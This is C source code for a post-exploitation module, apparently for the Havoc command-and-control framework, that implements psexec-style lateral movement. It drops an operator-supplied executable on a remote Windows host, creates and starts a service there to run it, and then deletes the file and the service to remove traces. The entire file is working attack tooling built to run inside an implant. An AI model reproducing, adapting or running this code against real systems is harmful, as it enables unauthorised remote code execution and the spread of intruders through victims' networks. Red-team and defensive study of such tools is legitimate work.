#include <windows.h>
#include "beacon.h"

/* Havoc console output modes */ 
#define HAVOC_CONSOLE_GOOD 0x90
#define HAVOC_CONSOLE_INFO 0x91
#define HAVOC_CONSOLE_ERRO 0x92

/* Defines */ 
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA( 
    LPCSTR  lpMachineName, 
    LPCSTR  lpDatabaseName, 
    DWORD   dwDesiredAccess 
);

WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(
    SC_HANDLE   hSCManager,
    LPCSTR      lpServiceName,
    LPCSTR      lpDisplayName,
    DWORD       dwDesiredAccess,
    DWORD       dwServiceType,
    DWORD       dwStartType,
    DWORD       dwErrorControl,
    LPCSTR      lpBinaryPathName,
    LPCSTR      lpLoadOrderGroup,
    LPDWORD     lpdwTagId,
    LPCSTR      lpDependencies,
    LPCSTR      lpServiceStartName,
    LPCSTR      lpPassword
);

WINADVAPI WINBOOL WINAPI ADVAPI32$StartServiceA(
    SC_HANDLE   hService,
    DWORD       dwNumServiceArgs,
    LPCSTR*     lpServiceArgVectors
);


WINADVAPI  WINBOOL WINAPI ADVAPI32$CloseServiceHandle( SC_HANDLE hSCObject );
WINADVAPI  WINBOOL WINAPI ADVAPI32$DeleteService( SC_HANDLE hService );
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError();
WINBASEAPI VOID    WINAPI KERNEL32$CloseHandle( HANDLE Handle );
WINBASEAPI BOOL    WINAPI KERNEL32$DeleteFileA( LPCSTR lpFileName );
/* psexec entrypoint code */ 
VOID go( PVOID Buffer, ULONG Length )
{
    datap  Parser        = { 0 };
    DWORD  SvcBinarySize = 0;
    DWORD  Written       = 0;
    PCHAR  Host          = NULL;
    PCHAR  SvcName       = NULL;
    PCHAR  SvcBinary     = NULL;
    PCHAR  SvcPath       = NULL;
    BOOL   Success       = FALSE;

    HANDLE hFile         = NULL;
    HANDLE hSvcManager   = NULL;
    HANDLE hSvcService   = NULL;

    /* Prepare our argument buffer */
    BeaconDataParse( &Parser, Buffer, Length );

    /* Parse our arguments */
    Host      = BeaconDataExtract( &Parser, NULL );
    SvcName   = BeaconDataExtract( &Parser, NULL );
    SvcBinary = BeaconDataExtract( &Parser, &SvcBinarySize );
    SvcPath   = BeaconDataExtract( &Parser, NULL );

    // BeaconPrintf( HAVOC_CONSOLE_GOOD, "Psexec [Host: %s] [SvcName: %s] [SvcPath: %s]", Host, SvcName, SvcPath );

    /* Upload service file to target machine (overwrite existing file)*/
    hFile = KERNEL32$CreateFileA( SvcPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE )
    {
        BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    if ( ! KERNEL32$WriteFile( hFile, SvcBinary, SvcBinarySize, &Written, NULL ) )
    {
        BeaconPrintf( HAVOC_CONSOLE_ERRO, "WriteFile Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    BeaconPrintf( HAVOC_CONSOLE_INFO, "Dropped service executable on %s at %s", Host, SvcPath );

    /* Close the file */
    KERNEL32$CloseHandle( hFile );
    hFile = NULL;

    /* Open Service manager. Create and start our service. The magic happens here :P */
    // NOTE: OpenSCManagerA is going to use SERVICES_ACTIVE_DATABASE by default if lpDatabaseName == NULL. 
    hSvcManager = ADVAPI32$OpenSCManagerA( Host, NULL, SC_MANAGER_ALL_ACCESS );
  	if ( ! hSvcManager ) 
    {
		BeaconPrintf( HAVOC_CONSOLE_ERRO, "OpenSCManagerA Failed: %d", KERNEL32$GetLastError() );
	    goto EXIT;
	}

    hSvcService = ADVAPI32$CreateServiceA( hSvcManager, SvcName, NULL, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcPath, NULL, NULL, NULL, NULL, NULL );
	if ( ! hSvcService ) 
    {
	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
	}

    BeaconPrintf( HAVOC_CONSOLE_INFO, "Starting Service executable..." );

    // TODO: check if service is dead after starting it. maybe we trying to start a buggy one...
    // TODO: add check for ERROR_SERVICE_REQUEST_TIMEOUT
    if ( ! ADVAPI32$StartServiceA( hSvcService, 0, NULL ) ) 
    {
	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
	}

    BeaconPrintf( HAVOC_CONSOLE_INFO, "Successful started Service executable" );

    if ( ! KERNEL32$DeleteFileA( SvcPath ) )
        BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete service executable %s from %s Error:[%d]", SvcPath, Host, KERNEL32$GetLastError() );
    else
        BeaconPrintf( HAVOC_CONSOLE_INFO, "Deleted service executable %s from %s", SvcPath, Host );

    Success = TRUE; 

EXIT:
    if ( hFile )
    {
        KERNEL32$CloseHandle( hFile );
        hFile = NULL;
    }

    if ( ! ADVAPI32$DeleteService( hSvcService ) ) 
		BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );

    if ( hSvcService )
    {
        ADVAPI32$CloseServiceHandle( hSvcService );
        hSvcService = NULL;
    }

    if ( hSvcManager )
    {
        ADVAPI32$CloseServiceHandle( hSvcManager );
        hSvcManager = NULL;
    }

    if ( Success )
        BeaconPrintf( HAVOC_CONSOLE_GOOD, "psexec successful executed on %s", Host );
    else
        BeaconPrintf( HAVOC_CONSOLE_ERRO, "psexec failed to execut on %s", Host );
}
